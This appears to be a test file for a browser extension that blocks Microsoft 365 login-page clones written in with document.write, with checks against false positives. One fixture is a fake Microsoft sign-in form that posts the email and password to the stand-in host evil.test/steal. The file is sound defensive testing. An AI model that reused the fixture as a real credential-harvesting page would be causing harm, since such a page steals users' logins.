import assert from "node:assert/strict";
import fs from "node:fs";
import test from "node:test";
import { JSDOM, VirtualConsole } from "jsdom";

const rules = JSON.parse(
  fs.readFileSync(new URL("../rules/detection-rules.json", import.meta.url), "utf8")
);
const contentSource = fs.readFileSync(new URL("./content.js", import.meta.url), "utf8");

function loaderHtml() {
  return `<!DOCTYPE html>
<html>
  <body>
    <p>Loading your document...</p>
  </body>
</html>`;
}

function compactPhishHtml() {
  return `<!DOCTYPE html>
<html>
  <body>
    <form method="post" action="https://evil.test/steal">
      <input name="loginfmt" id="i0116" type="email" placeholder="Email">
      <input type="password" name="passwd">
      <button type="submit" id="idSIButton9">Sign in</button>
      <div>Microsoft</div>
      <div>idPartnerPL</div>
      <div>https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/x.jpg</div>
    </form>
  </body>
</html>`;
}

function plainHtml() {
  return `<!DOCTYPE html>
<html>
  <body>
    <form method="post" action="/session">
      <input type="email" name="email">
      <input type="password" name="password">
      <button type="submit">Continue</button>
    </form>
  </body>
</html>`;
}

function installChrome(window) {
  window.chrome = {
    runtime: {
      lastError: null,
      getURL(path) {
        return `chrome-extension://test/${path}`;
      },
      sendMessage(message) {
        if (message && message.type === "get_detection_rules") {
          return Promise.resolve({ success: true, rules });
        }
        return Promise.resolve({ success: true, ok: true });
      },
      onMessage: { addListener() {} },
    },
    storage: {
      local: {
        get(keys, callback) {
          const result = {};
          const names = Array.isArray(keys) ? keys : [keys];
          for (const name of names) {
            if (name === "config") {
              result.config = { enablePageBlocking: true };
            }
            if (name === "brandingConfig") {
              result.brandingConfig = {};
            }
          }
          if (typeof callback === "function") {
            callback(result);
          }
          return Promise.resolve(result);
        },
        set(_payload, callback) {
          if (typeof callback === "function") {
            callback();
          }
          return Promise.resolve();
        },
      },
    },
  };
}

async function loadPage(html, url) {
  const virtualConsole = new VirtualConsole();
  const dom = new JSDOM(html, {
    url,
    runScripts: "outside-only",
    pretendToBeVisual: true,
    virtualConsole,
  });
  const { window } = dom;
  installChrome(window);
  const redirects = [];
  const locationProto = Object.getPrototypeOf(window.location);
  const originalReplace = locationProto.replace;
  Object.defineProperty(locationProto, "replace", {
    configurable: true,
    writable: true,
    value(nextUrl) {
      redirects.push(String(nextUrl));
      return originalReplace.call(this, nextUrl);
    },
  });
  window.eval(contentSource);
  return { window, redirects };
}

function writeDocument(window, html) {
  window.document.open();
  window.document.write(html);
  window.document.close();
}

async function waitFor(predicate, timeoutMs) {
  const started = Date.now();
  while (Date.now() - started < timeoutMs) {
    if (predicate()) {
      return;
    }
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
  throw new Error(`timed out after ${timeoutMs}ms`);
}

test("compact login clone injected with document.write is blocked", async () => {
  const { window, redirects } = await loadPage(
    loaderHtml(),
    "https://evil.example/doc"
  );

  try {
    await new Promise((resolve) => setTimeout(resolve, 600));
    assert.equal(redirects.length, 0);
    assert.equal(window.document.querySelector('input[type="password"]'), null);

    const before = window.document.documentElement;
    writeDocument(window, compactPhishHtml());
    assert.notEqual(window.document.documentElement, before);
    assert.ok(window.document.querySelectorAll("*").length < 50);
    assert.ok((window.document.body.textContent || "").length < 1000);

    const input = window.document.querySelector('input[type="password"]');
    await waitFor(
      () => input.disabled || redirects.some((url) => url.includes("blocked.html")),
      4000
    );

    assert.ok(
      input.disabled || redirects.some((url) => url.includes("blocked.html")),
      "expected the document.write login clone to be disabled or redirected to the block page"
    );
  } finally {
    window.close();
  }
});

test("document.write of an ordinary login page is not blocked", async () => {
  const { window, redirects } = await loadPage(
    loaderHtml(),
    "https://bank.example/start"
  );

  try {
    await new Promise((resolve) => setTimeout(resolve, 600));
    writeDocument(window, plainHtml());
    const input = window.document.querySelector('input[type="password"]');
    await new Promise((resolve) => setTimeout(resolve, 800));

    assert.equal(input.disabled, false);
    assert.equal(redirects.length, 0);
    assert.equal(window.document.getElementById("ms365-warning-banner"), null);
  } finally {
    window.close();
  }
});

test("document.write on the real Microsoft login host is not blocked", async () => {
  const { window, redirects } = await loadPage(
    loaderHtml(),
    "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
  );

  try {
    await new Promise((resolve) => setTimeout(resolve, 600));
    writeDocument(window, compactPhishHtml());
    const input = window.document.querySelector('input[type="password"]');
    await new Promise((resolve) => setTimeout(resolve, 800));

    assert.equal(input.disabled, false);
    assert.equal(redirects.length, 0);
  } finally {
    window.close();
  }
});
